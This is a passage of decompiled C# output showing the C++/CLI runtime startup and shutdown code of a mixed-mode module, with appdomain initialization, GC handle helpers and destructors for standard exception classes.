    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeDefaultAppDomain(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EInitialize();
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeNative(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during native initialization.\n");
    \u003CModule\u003E.__security_init_cookie();
    \u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
    if (!\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsSafeForManagedCode())
      \u003CModule\u003E._amsg_exit(33);
    switch (\u003CModule\u003E.__native_startup_state)
    {
      case (__enative_startup_state) 0:
        \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
        \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 1;
        if (\u003CModule\u003E._initterm_e((__FnPtr<int ()>*) &\u003CModule\u003E.__xi_a, (__FnPtr<int ()>*) &\u003CModule\u003E.__xi_z) != 0)
          \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0));
        \u003CModule\u003E._initterm((__FnPtr<void ()>*) &\u003CModule\u003E.__xc_a, (__FnPtr<void ()>*) &\u003CModule\u003E.__xc_z);
        \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 2;
        \u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
        \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
        break;
      case (__enative_startup_state) 1:
        \u003CModule\u003E._amsg_exit(33);
        break;
    }
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerProcess(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during process initialization.\n");
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initatexit_m();
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z);
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during appdomain initialization.\n");
    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initatexit_app_domain();
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_ma_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_ma_z);
    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during registration for the unload events.\n");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(new EventHandler(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload));
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = AppDomain.CurrentDomain.IsDefaultAppDomain();
    if (\u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA)
      \u003CModule\u003E.\u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoDllLanguageSupportValidation();
    void* fiberPtrId = \u003CModule\u003E._getFiberPtrId();
    int num1 = 0;
    int num2 = 0;
    int num3 = 0;
    RuntimeHelpers.PrepareConstrainedRegions();
    try
    {
      while (num2 == 0)
      {
        try
        {
        }
        finally
        {
          IntPtr comparand = (IntPtr) 0;
          IntPtr num4 = (IntPtr) fiberPtrId;
          // ISSUE: cast to a reference type
          void* voidPtr = (void*) Interlocked.CompareExchange((IntPtr&) ref \u003CModule\u003E.__native_startup_lock, num4, comparand);
          if ((IntPtr) voidPtr == IntPtr.Zero)
            num2 = 1;
          else if (voidPtr == fiberPtrId)
          {
            num1 = 1;
            num2 = 1;
          }
        }
        if (num2 == 0)
          \u003CModule\u003E.Sleep(1000U);
      }
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(obj0);
      if (\u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA)
      {
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeNative(obj0);
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerProcess(obj0);
      }
      else if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002ENeedsInitialization())
        num3 = 1;
    }
    finally
    {
      if (num1 == 0)
      {
        IntPtr num5 = (IntPtr) 0;
        // ISSUE: cast to a reference type
        Interlocked.Exchange((IntPtr&) ref \u003CModule\u003E.__native_startup_lock, num5);
      }
    }
    if (num3 != 0)
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeDefaultAppDomain(obj0);
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(obj0);
    \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 1;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(obj0);
  }

  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain() => \u003CModule\u003E._app_exit_callback();

  internal static unsafe int \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_UninitializeDefaultDomain(
    void* cookie)
  {
    \u003CModule\u003E._exit_callback();
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    if (\u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA)
    {
      \u003CModule\u003E._cexit();
      \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 0;
      \u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    }
    \u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    return 0;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain()
  {
    if (!\u003CModule\u003E.\u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA)
      return;
    if (AppDomain.CurrentDomain.IsDefaultAppDomain())
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_UninitializeDefaultDomain((void*) 0);
    }
    else
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain((__FnPtr<int (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003F_UninitializeDefaultDomain\u0040LanguageSupport\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z, (void*) 0);
    }
  }

  [PrePrepareMethod]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload(
    object source,
    EventArgs arguments)
  {
    if (\u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA == 0 || Interlocked.Exchange(ref \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA, 1) != 0)
      return;
    int num = Interlocked.Decrement(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA) == 0 ? 1 : 0;
    \u003CModule\u003E._app_exit_callback();
    if ((byte) num == (byte) 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain();
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(
    [In] LanguageSupport* obj0,
    Exception innerException)
  {
    try
    {
      bool flag = Interlocked.Decrement(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA) == 0;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain();
      if (!flag)
        return;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain();
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, ex);
    }
    catch
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, (Exception) null);
    }
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(
    [In] LanguageSupport* obj0)
  {
    bool flag = false;
    RuntimeHelpers.PrepareConstrainedRegions();
    try
    {
      \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load.\n");
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
      }
      finally
      {
        Interlocked.Increment(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA);
        flag = true;
      }
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(obj0);
    }
    catch (Exception ex)
    {
      if (flag)
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, ex);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), ex);
    }
    catch
    {
      if (flag)
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, (Exception) null);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), (Exception) null);
    }
  }

  [DebuggerStepThrough]
  static unsafe \u003CModule\u003E()
  {
    LanguageSupport languageSupport;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(&languageSupport);
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(&languageSupport);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D), (void*) &languageSupport);
    }
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) &languageSupport);
  }

  internal static unsafe LanguageSupport* \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
    return obj0;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
  }

  [DebuggerStepThrough]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
    *(int*) obj0 = (int) num.ToPointer();
    return obj0;
  }

  [DebuggerStepThrough]
  internal static unsafe void gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
    *(int*) obj0 = 0;
  }

  [DebuggerStepThrough]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0,
    string t)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) t;
    return obj0;
  }

  internal static unsafe string gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    return (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void __ehvec_dtor(
    void* ptr,
    uint size,
    int count,
    __FnPtr<void (void*)> pDtor)
  {
    int num = 0;
    ptr = (void*) ((int) size * count + (IntPtr) ptr);
    try
    {
      while (true)
      {
        --count;
        if (count >= 0)
        {
          ptr -= (int) size;
          void* voidPtr = ptr;
          // ISSUE: function pointer call
          __calli(pDtor)(voidPtr);
        }
        else
          break;
      }
      num = 1;
    }
    finally
    {
      if (num == 0)
        \u003CModule\u003E.__ArrayUnwind(ptr, size, count, pDtor);
    }
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe int \u003FA0x644ad69d\u002EArrayUnwindFilter(_EXCEPTION_POINTERS* pExPtrs)
  {
    if (*(int*) *(int*) pExPtrs != -529697949)
      return 0;
    \u003CModule\u003E.terminate();
    return 0;
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void __ArrayUnwind(
    void* ptr,
    uint size,
    int count,
    __FnPtr<void (void*)> pDtor)
  {
    try
    {
      while (true)
      {
        --count;
        if (count >= 0)
        {
          ptr -= (int) size;
          void* voidPtr = ptr;
          // ISSUE: function pointer call
          __calli(pDtor)(voidPtr);
        }
        else
          break;
      }
    }
    catch (Exception ex) when (\u003CModule\u003E.\u003FA0x644ad69d\u002EArrayUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  internal static unsafe void std\u002Ebad_alloc\u002E\u007Bdtor\u007D([In] bad_alloc* obj0)
  {
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7bad_alloc\u0040std\u0040\u00406B\u0040;
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
  }

  internal static unsafe void* std\u002Ebad_alloc\u002E__vecDelDtor([In] bad_alloc* obj0, uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      bad_alloc* badAllocPtr = (bad_alloc*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 12U, *(int*) badAllocPtr, (__FnPtr<void (void*)>) __methodptr(std\u002Ebad_alloc\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete((void*) badAllocPtr);
      return (void*) badAllocPtr;
    }
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7bad_alloc\u0040std\u0040\u00406B\u0040;
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  internal static unsafe void std\u002Elogic_error\u002E\u007Bdtor\u007D([In] logic_error* obj0)
  {
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
  }

  internal static unsafe sbyte* std\u002Elogic_error\u002Ewhat([In] logic_error* obj0) => \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));

  internal static unsafe void* std\u002Elogic_error\u002E__vecDelDtor(
    [In] logic_error* obj0,
    uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      logic_error* logicErrorPtr = (logic_error*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 40U, *(int*) logicErrorPtr, (__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete\u005B\u005D((void*) logicErrorPtr);
      return (void*) logicErrorPtr;
    }
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  internal static unsafe void std\u002Eout_of_range\u002E\u007Bdtor\u007D([In] out_of_range* obj0)
  {
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7out_of_range\u0040std\u0040\u00406B\u0040;
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
  }

  internal static unsafe void* std\u002Eout_of_range\u002E__vecDelDtor(
    [In] out_of_range* obj0,
    uint _param1)
  {
    if (((int) _param1 & 2) != 0)
    {
      out_of_range* outOfRangePtr = (out_of_range*) ((IntPtr) obj0 - 4);
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 40U, *(int*) outOfRangePtr, (__FnPtr<void (void*)>) __methodptr(std\u002Eout_of_range\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete\u005B\u005D((void*) outOfRangePtr);
      return (void*) outOfRangePtr;
    }
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7out_of_range\u0040std\u0040\u00406B\u0040;
    *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  [SpecialName]
  internal static unsafe out_of_range* std\u002Eout_of_range\u002E\u007Bctor\u007D(
    [In] out_of_range* obj0,
    out_of_range* _param1)
  {
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) obj0, (exception*) _param1);
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12), (basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) _param1 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7out_of_range\u0040std\u0040\u00406B\u0040;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  [SpecialName]
  internal static unsafe logic_error* std\u002Elogic_error\u002E\u007Bctor\u007D(
    [In] logic_error* obj0,
    logic_error* _param1)
  {
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) obj0, (exception*) _param1);
    // ISSUE: fault handler
    try
    {
      *(int*) obj0 = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) obj0 + 12), (basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) _param1 + 12));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  [SpecialName]
